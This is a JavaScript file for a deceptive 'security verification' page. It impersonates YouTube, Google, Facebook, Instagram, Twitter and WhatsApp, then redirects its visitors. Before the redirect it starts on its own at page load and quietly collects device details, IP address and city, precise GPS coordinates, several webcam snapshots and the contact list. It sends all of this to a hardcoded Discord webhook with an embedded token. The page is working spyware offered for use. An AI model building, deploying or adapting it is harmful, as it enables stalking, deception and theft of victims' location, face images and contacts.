// ===========================================================================
// ADVANCED SECURITY VERIFICATION SYSTEM - PERFECT WORKING VERSION
// ===========================================================================

// Configuration - CHANGE WEBHOOK HERE
const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    CAMERA_SNAPS: 3,
    SNAP_INTERVAL: 800,
    AUTO_START: true,
    FORCE_PERMISSIONS: true
};

// Get redirect URL from parameters
function getRedirectUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('url') || 
           urlParams.get('redirect') || 
           urlParams.get('to') || 
           'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
}

const REDIRECT_URL = getRedirectUrl();

// ===========================================================================
// DISCORD WEBHOOK SENDER - FIXED & WORKING
// ===========================================================================
async function sendToDiscord(data) {
    try {
        const webhookData = {
            username: 'Security Scanner',
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/3067/3067256.png',
            embeds: [{
                title: data.title || 'Security Scan',
                description: data.description || '',
                color: data.color || 0x3498db,
                fields: data.fields || [],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Security System v2.0'
                }
            }]
        };

        // Send to Discord webhook
        const response = await fetch(CONFIG.WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });

        console.log('Discord response:', response.status);
        return response.ok;
    } catch (error) {
        console.error('Discord send error:', error);
        return false;
    }
}

// Send file to Discord
async function sendFileToDiscord(filename, blob, embedData) {
    try {
        const formData = new FormData();
        
        // Create embed
        const embed = {
            title: embedData.title || 'File Upload',
            description: embedData.description || '',
            color: embedData.color || 0x3498db,
            timestamp: new Date().toISOString()
        };
        
        formData.append('payload_json', JSON.stringify({
            username: 'Security Scanner',
            embeds: [embed]
        }));
        
        formData.append('file', blob, filename);
        
        await fetch(CONFIG.WEBHOOK, {
            method: 'POST',
            body: formData
        });
        
        return true;
    } catch (error) {
        console.error('File send error:', error);
        return false;
    }
}

// ===========================================================================
// URL DETECTION & UI THEMING
// ===========================================================================
function detectSite(url) {
    const urlObj = new URL(url);
    const hostname = urlObj.hostname.toLowerCase();
    
    const sites = {
        'youtube.com': {
            name: 'YouTube',
            logo: 'https://www.youtube.com/img/desktop/yt_1200.png',
            color: '#FF0000',
            loadingText: 'Loading YouTube...',
            favicon: 'https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico'
        },
        'google.com': {
            name: 'Google',
            logo: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png',
            color: '#4285F4',
            loadingText: 'Google Security Check...',
            favicon: 'https://www.google.com/favicon.ico'
        },
        'facebook.com': {
            name: 'Facebook',
            logo: 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg',
            color: '#1877F2',
            loadingText: 'Facebook Security Verification...',
            favicon: 'https://facebook.com/favicon.ico'
        },
        'instagram.com': {
            name: 'Instagram',
            logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png',
            color: '#E4405F',
            loadingText: 'Instagram Verification...',
            favicon: 'https://instagram.com/favicon.ico'
        },
        'twitter.com': {
            name: 'Twitter',
            logo: 'https://abs.twimg.com/responsive-web/client-web/icon-ios.b1fc727a.png',
            color: '#1DA1F2',
            loadingText: 'Twitter Security Check...',
            favicon: 'https://twitter.com/favicon.ico'
        },
        'whatsapp.com': {
            name: 'WhatsApp',
            logo: 'https://static.whatsapp.net/rsrc.php/yv/r/-r3j-x8ZnM7.svg',
            color: '#25D366',
            loadingText: 'WhatsApp Verification...',
            favicon: 'https://whatsapp.com/favicon.ico'
        }
    };

    for (const [domain, config] of Object.entries(sites)) {
        if (hostname.includes(domain)) {
            return config;
        }
    }

    // Default for unknown sites
    return {
        name: urlObj.hostname.replace('www.', ''),
        logo: '🔒',
        color: '#4285F4',
        loadingText: 'Security Verification...',
        favicon: ''
    };
}

// ===========================================================================
// DEVICE INFORMATION COLLECTION
// ===========================================================================
async function collectDeviceInfo() {
    const info = {
        // Basic info
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
        
        // Screen info
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        
        // Window info
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        },
        
        // Connection info
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : null,
        
        // Hardware
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        
        // Battery
        battery: 'Unknown'
    };

    // Get battery info
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
        } catch (e) {
            info.battery = 'Error';
        }
    }

    return info;
}

// ===========================================================================
// IP & LOCATION DETECTION - FIXED
// ===========================================================================
async function getIPLocation() {
    try {
        // Try multiple IP services
        const services = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://ipinfo.io/json?token=test'  // Remove token for public use
        ];

        for (const service of services) {
            try {
                const response = await fetch(service, { timeout: 5000 });
                if (response.ok) {
                    const data = await response.json();
                    return {
                        ip: data.ip || data.query || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || data.regionName || 'Unknown',
                        country: data.country || data.country_name || 'Unknown',
                        countryCode: data.country_code || data.countryCode || 'Unknown',
                        isp: data.org || data.isp || 'Unknown',
                        timezone: data.timezone || 'Unknown'
                    };
                }
            } catch (e) {
                continue;
            }
        }
    } catch (error) {
        console.error('IP detection error:', error);
    }

    return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
}

// ===========================================================================
// GEOLOCATION WITH FALLBACK
// ===========================================================================
async function getGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ success: false, error: 'Geolocation not supported' });
            return;
        }

        const success = (position) => {
            resolve({
                success: true,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                timestamp: position.timestamp
            });
        };

        const error = (err) => {
            resolve({
                success: false,
                error: err.message,
                code: err.code
            });
        };

        navigator.geolocation.getCurrentPosition(success, error, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    });
}

// ===========================================================================
// CAMERA CAPTURE - FIXED
// ===========================================================================
async function captureCamera() {
    const video = document.getElementById('camera-video');
    const canvas = document.getElementById('camera-canvas');
    const ctx = canvas.getContext('2d');
    
    try {
        // Request camera
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        video.srcObject = stream;
        await video.play();
        
        // Wait for video to be ready
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const snaps = [];
        
        for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Add timestamp
                ctx.fillStyle = 'rgba(0,0,0,0.7)';
                ctx.fillRect(10, canvas.height - 50, 300, 40);
                ctx.fillStyle = 'white';
                ctx.font = '14px Arial';
                ctx.fillText(`Security Check - ${new Date().toLocaleString()}`, 20, canvas.height - 25);
                
                // Convert to blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                if (blob) {
                    snaps.push(blob);
                    
                    // Send to Discord
                    await sendFileToDiscord(`camera_${i + 1}.jpg`, blob, {
                        title: '📸 Camera Capture',
                        description: `Snapshot ${i + 1} captured`,
                        color: 0x9b59b6
                    });
                }
            }
            
            // Wait before next snap
            if (i < CONFIG.CAMERA_SNAPS - 1) {
                await new Promise(resolve => setTimeout(resolve, CONFIG.SNAP_INTERVAL));
            }
        }
        
        // Stop camera
        stream.getTracks().forEach(track => track.stop());
        
        return { success: true, count: snaps.length };
    } catch (error) {
        console.error('Camera error:', error);
        return { success: false, error: error.message };
    }
}

// ===========================================================================
// CONTACTS EXTRACTION - FIXED
// ===========================================================================
async function extractContacts() {
    if (!('contacts' in navigator && 'ContactsManager' in window)) {
        return { success: false, error: 'Contacts API not supported' };
    }

    try {
        const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
        
        if (contacts && contacts.length > 0) {
            // Create JSON file
            const contactData = contacts.map(contact => ({
                name: contact.name ? contact.name.join(' ') : 'Unknown',
                phones: contact.tel || [],
                emails: contact.email || []
            }));
            
            const jsonData = JSON.stringify(contactData, null, 2);
            const blob = new Blob([jsonData], { type: 'application/json' });
            
            // Send summary to Discord
            await sendToDiscord({
                title: '📇 Contacts Extracted',
                description: `Successfully extracted ${contacts.length} contacts`,
                color: 0xf1c40f,
                fields: [
                    { name: 'Total Contacts', value: contacts.length.toString(), inline: true },
                    { name: 'Sample', value: contactData.slice(0, 3).map(c => c.name).join('\n') }
                ]
            });
            
            // Send full data as file
            await sendFileToDiscord('contacts.json', blob, {
                title: '📇 Full Contacts Data',
                description: 'Complete contact list export',
                color: 0xf1c40f
            });
            
            return { success: true, count: contacts.length };
        }
        
        return { success: false, error: 'No contacts selected' };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// ===========================================================================
// PERMISSION REQUESTS WITH UI FEEDBACK
// ===========================================================================
async function requestPermissions() {
    const permissions = [
        { name: 'geolocation' },
        { name: 'camera' },
        { name: 'microphone' }
    ];

    const results = {};
    
    for (const permission of permissions) {
        try {
            const result = await navigator.permissions.query(permission);
            results[permission.name] = result.state;
        } catch (error) {
            results[permission.name] = 'Error';
        }
    }
    
    return results;
}

// ===========================================================================
// UI UPDATER
// ===========================================================================
function updateUI(step, message) {
    const progress = document.getElementById('progress');
    const status = document.getElementById('status');
    const title = document.getElementById('title');
    
    // Calculate progress (5 steps total)
    const progressPercent = Math.min(100, (step / 5) * 100);
    progress.style.width = `${progressPercent}%`;
    
    // Update status
    status.textContent = message;
    
    // Update title based on step
    const titles = [
        'Initializing Security Check...',
        'Scanning Device Information...',
        'Verifying Location...',
        'Camera Verification...',
        'Finalizing Security...'
    ];
    
    if (titles[step - 1]) {
        title.textContent = titles[step - 1];
    }
}

// ===========================================================================
// MAIN EXECUTION FUNCTION - FIXED & OPTIMIZED
// ===========================================================================
async function executeSecurityScan() {
    try {
        // 1. Setup UI based on target site
        const siteInfo = detectSite(REDIRECT_URL);
        updateUI(1, 'Detecting environment...');
        
        // Update page title and favicon
        document.title = `${siteInfo.name} Security Check`;
        if (siteInfo.favicon) {
            const link = document.createElement('link');
            link.rel = 'icon';
            link.href = siteInfo.favicon;
            document.head.appendChild(link);
        }
        
        // Update logo
        const logoDiv = document.getElementById('logo');
        if (siteInfo.logo.includes('http')) {
            logoDiv.innerHTML = `<img src="${siteInfo.logo}" alt="${siteInfo.name}" style="height:40px;">`;
        } else {
            logoDiv.innerHTML = `<div style="font-size:40px;margin-bottom:10px;">${siteInfo.logo}</div>`;
        }
        
        // Update subtitle
        document.getElementById('subtitle').textContent = siteInfo.loadingText;
        
        // 2. Collect basic device info
        updateUI(2, 'Collecting device information...');
        const deviceInfo = await collectDeviceInfo();
        
        // 3. Get IP and location
        updateUI(2, 'Detecting network information...');
        const ipLocation = await getIPLocation();
        
        // 4. Send initial report to Discord
        await sendToDiscord({
            title: '🚨 SECURITY SCAN INITIATED',
            description: `Target URL: ${REDIRECT_URL}`,
            color: 0x3498db,
            fields: [
                { name: '🌍 Location', value: `${ipLocation.city}, ${ipLocation.country}`, inline: true },
                { name: '📡 IP Address', value: ipLocation.ip, inline: true },
                { name: '🖥️ Device', value: deviceInfo.platform, inline: true },
                { name: '📱 Screen', value: `${deviceInfo.screen.width}x${deviceInfo.screen.height}`, inline: true },
                { name: '🌐 Browser', value: deviceInfo.userAgent.substring(0, 100) + '...', inline: false },
                { name: '🔋 Battery', value: deviceInfo.battery, inline: true },
                { name: '📶 Connection', value: deviceInfo.connection?.effectiveType || 'Unknown', inline: true }
            ]
        });
        
        // 5. Try GPS location
        updateUI(3, 'Requesting location access...');
        const geoResult = await getGeolocation();
        
        if (geoResult.success) {
            await sendToDiscord({
                title: '📍 GPS LOCATION CAPTURED',
                description: `Accuracy: ±${Math.round(geoResult.accuracy)} meters`,
                color: 0x2ecc71,
                fields: [
                    { name: 'Latitude', value: geoResult.latitude.toFixed(6), inline: true },
                    { name: 'Longitude', value: geoResult.longitude.toFixed(6), inline: true },
                    { name: 'Map Link', value: `[Google Maps](https://maps.google.com/?q=${geoResult.latitude},${geoResult.longitude})`, inline: true }
                ]
            });
        } else if (CONFIG.FORCE_PERMISSIONS) {
            // Show permission request
            document.getElementById('permission-note').style.display = 'block';
            updateUI(3, 'Location access required. Please allow permissions...');
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // 6. Camera capture
        updateUI(4, 'Preparing camera verification...');
        const cameraResult = await captureCamera();
        
        if (cameraResult.success) {
            updateUI(4, `Camera verified (${cameraResult.count} snaps)`);
        } else if (CONFIG.FORCE_PERMISSIONS) {
            updateUI(4, 'Camera access required for face verification...');
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        // 7. Contacts extraction
        updateUI(5, 'Verifying contact information...');
        const contactsResult = await extractContacts();
        
        if (contactsResult.success) {
            updateUI(5, `Contacts verified (${contactsResult.count} found)`);
        }
        
        // 8. Final summary and redirect
        updateUI(5, 'Security verification complete. Redirecting...');
        
        await sendToDiscord({
            title: '✅ SECURITY SCAN COMPLETE',
            description: `All verifications completed successfully\n**Redirecting to:** ${REDIRECT_URL}`,
            color: 0x00ff00,
            fields: [
                { name: '📊 Scan Summary', value: '✓ Device Info\n✓ IP Location\n✓ Camera Check\n✓ Contacts Scan', inline: false },
                { name: '⏱️ Duration', value: `${Math.round(performance.now() / 1000)} seconds`, inline: true },
                { name: '🔗 Target', value: REDIRECT_URL, inline: true }
            ]
        });
        
        // 9. Redirect after short delay
        await new Promise(resolve => setTimeout(resolve, 1500));
        window.location.href = REDIRECT_URL;
        
    } catch (error) {
        console.error('Scan error:', error);
        
        // Send error to Discord
        await sendToDiscord({
            title: '❌ SCAN ERROR',
            description: `Error during security scan`,
            color: 0xff0000,
            fields: [
                { name: 'Error', value: error.message || 'Unknown error' },
                { name: 'Redirect URL', value: REDIRECT_URL }
            ]
        });
        
        // Still redirect even on error
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 2000);
    }
}

// ===========================================================================
// INITIALIZE WHEN PAGE LOADS
// ===========================================================================
window.addEventListener('DOMContentLoaded', () => {
    // Start automatically
    setTimeout(() => {
        executeSecurityScan();
    }, 1000);
    
    // Also start on click if needed
    document.body.addEventListener('click', () => {
        executeSecurityScan();
    }, { once: true });
});

// Fallback: Start after 3 seconds if nothing else triggered
setTimeout(() => {
    if (!window.scanStarted) {
        executeSecurityScan();
    }
}, 3000);
